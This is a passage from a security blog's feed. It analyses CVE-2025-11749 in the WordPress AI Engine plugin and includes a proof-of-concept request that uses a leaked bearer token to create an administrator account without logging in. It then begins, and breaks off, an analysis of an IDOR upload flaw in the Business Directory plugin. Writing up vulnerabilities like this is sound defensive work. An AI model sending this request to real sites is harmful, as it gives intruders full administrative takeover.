data-sub-html=&#34;&lt;h2&gt;Init&lt;/h2&gt;&lt;p&gt;Meow_MWAI_Labs_MCP_Core initialized&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#39; alt=&#34;Init&#34; height=&#34;669&#34; width=&#34;1133&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Meow_MWAI_Labs_MCP_Core initialized&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This only happens when MCP Features are enabled in WordPress. This can be configured in the Admin Dashboard (&lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#34; title=&#34;Enable MCP Features WordPress&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable1.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable1&lt;/h2&gt;&lt;p&gt;Enable MCP Features WordPress&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#39; alt=&#34;Enable1&#34; height=&#34;353&#34; width=&#34;851&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable MCP Features WordPress&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Once the filter is active, the callback &lt;code&gt;handle_call&lt;/code&gt; is invoked:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_call( $prev, string $tool, array $args, int $id ) {&#xA;    // Security check is already done in the MCP auth layer&#xA;    // If we reach here, the user is authorized to use MCP&#xA;    if ( !empty( $prev ) || !isset( $this-&amp;gt;tools()[ $tool ] ) ) {&#xA;      return $prev;&#xA;    }&#xA;    return $this-&amp;gt;dispatch( $tool, $args, $id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the tool is valid, it calls &lt;code&gt;dispatch( $tool, $args, $id )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Among the available tools is &lt;code&gt;wp_create_user&lt;/code&gt;, which creates a new user with arbitrary privileges.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; title=&#34;Tool wp_create_user&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; data-sub-html=&#34;&lt;h2&gt;Tool&lt;/h2&gt;&lt;p&gt;Tool wp_create_user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#39; alt=&#34;Tool&#34; height=&#34;411&#34; width=&#34;1098&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tool wp_create_user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This tool requires the following parameters: &lt;code&gt;user_login&lt;/code&gt;, &lt;code&gt;user_email&lt;/code&gt;, &lt;code&gt;user_pass&lt;/code&gt;, &lt;code&gt;display_name&lt;/code&gt;, &lt;code&gt;role&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Example request body:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Continuing into &lt;code&gt;dispatch&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function dispatch( string $tool, array $a, int $id ): array {&#xA;    $r = [ &amp;#39;jsonrpc&amp;#39; =&amp;gt; &amp;#39;2.0&amp;#39;, &amp;#39;id&amp;#39; =&amp;gt; $id ];&#xA;    switch ( $tool ) {&#xA;    ...&#xA;      case &amp;#39;wp_create_user&amp;#39;:&#xA;        $data = [&#xA;          &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user( $a[&amp;#39;user_login&amp;#39;] ),&#xA;          &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email( $a[&amp;#39;user_email&amp;#39;] ),&#xA;          &amp;#39;user_pass&amp;#39; =&amp;gt; $a[&amp;#39;user_pass&amp;#39;] ?? wp_generate_password( 12, true ),&#xA;          &amp;#39;display_name&amp;#39; =&amp;gt; sanitize_text_field( $a[&amp;#39;display_name&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;          &amp;#39;role&amp;#39; =&amp;gt; sanitize_key( $a[&amp;#39;role&amp;#39;] ?? get_option( &amp;#39;default_role&amp;#39;, &amp;#39;subscriber&amp;#39; ) ),&#xA;        ];&#xA;        $uid = wp_insert_user( $data );&#xA;        if ( is_wp_error( $uid ) ) {&#xA;          $r[&amp;#39;error&amp;#39;] = [ &amp;#39;code&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_code(), &amp;#39;message&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_message() ];&#xA;        }&#xA;        else {&#xA;          $this-&amp;gt;add_result_text( $r, &amp;#39;User created ID &amp;#39; . $uid );&#xA;        }&#xA;        break;&#xA;    ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function calls &lt;code&gt;wp_insert_user&lt;/code&gt; to create a new WordPress user using attacker-controlled values → &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /wp-json&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;REST API exposes MCP endpoints (Bearer Token leaked)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Extract Bearer Token from response&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send POST request to /wp-json/mcp/v1/{token}/messages&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;permission_callback → handle_noauth_access()&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Bearer Token valid&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;wp_set_current_user(admin)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;handle_message()&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;method = tools/call&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;execute_tool()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;mwai_mcp_callback triggered&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;dispatch()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;wp_create_user()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;New administrator account created&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Privilege Escalation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Access &lt;code&gt;/wp-json&lt;/code&gt; to retrieve the &lt;strong&gt;Bearer Token&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Send request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/mcp/v1/{token}/messages HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Log in using the newly created account.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#39; alt=&#34;Result&#34; height=&#34;638&#34; width=&#34;1243&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in AI Engine (≤ 3.1.3) arises from an improper combination of the “No-Auth URL” mechanism and internal authorization logic, resulting in administrative privileges being granted based solely on a publicly exposed Bearer Token.&lt;/p&gt;&#xA;&lt;p&gt;Once the MCP endpoint is exposed in &lt;code&gt;/wp-json&lt;/code&gt;, an attacker can retrieve the token, invoke privileged APIs, and perform sensitive actions such as creating administrator accounts without authentication.&lt;/p&gt;&#xA;&lt;p&gt;Although admin privileges exist only for the duration of the request, a single successful request is sufficient to create a persistent administrator account, resulting in full privilege escalation.&lt;/p&gt;&#xA;&lt;p&gt;The v3.1.4 patch merely hides the endpoint from the REST index, reducing discoverability but not addressing the core security design flaw.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Never use tokens in URLs as an authentication mechanism.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hiding endpoints (&lt;code&gt;show_in_rest = false&lt;/code&gt;) is not security.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;&lt;code&gt;wp_set_current_user()&lt;/code&gt; should never be used for external authentication.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Any API capable of mutating system state must enforce strong authentication and authorization.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Temporary privilege elevation is sufficient to cause permanent compromise.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST APIs should follow a “deny by default” design principle.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-3-1-3-unauthenticated-sensitive-information-exposure-to-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin &amp;lt;= 3.1.3 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-13887 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-31-cve-2024-13887/</link>
      <pubDate>Wed, 31 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-31-cve-2024-13887/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Business Directory Plugin – Easy Listing Directories for WordPress&lt;/strong&gt; plugin contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions up to &lt;strong&gt;6.4.14&lt;/strong&gt;, through the &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; function due to missing validation on a user-controlled key. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to &lt;strong&gt;upload arbitrary images to listings&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-13887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-13887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.4.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/business-directory-plugin/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Business Directory&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.14&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.15&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for logged-out users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_wpbdp-listing-submit-image-upload&amp;#39;, array( &amp;amp;$this, &amp;#39;ajax_listing_submit_image_upload&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; is a hook available to all users, including unauthenticated users. When a request is sent to the &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; endpoint with the parameter &lt;code&gt;action=wpbdp-listing-submit-image-upload&lt;/code&gt;, the callback &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_listing_submit_image_upload() {&#xA;    $res = new WPBDP_AJAX_Response();&#xA;&#xA;    $listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;    ...&#xA;    $files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&#xA;    $errors = array();&#xA;&#xA;    $listing         = WPBDP_Listing::get( $listing_id );&#xA;    $slots_available = 0;&#xA;    $plan            = $listing-&amp;gt;get_fee_plan();&#xA;    if ( ! $plan ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    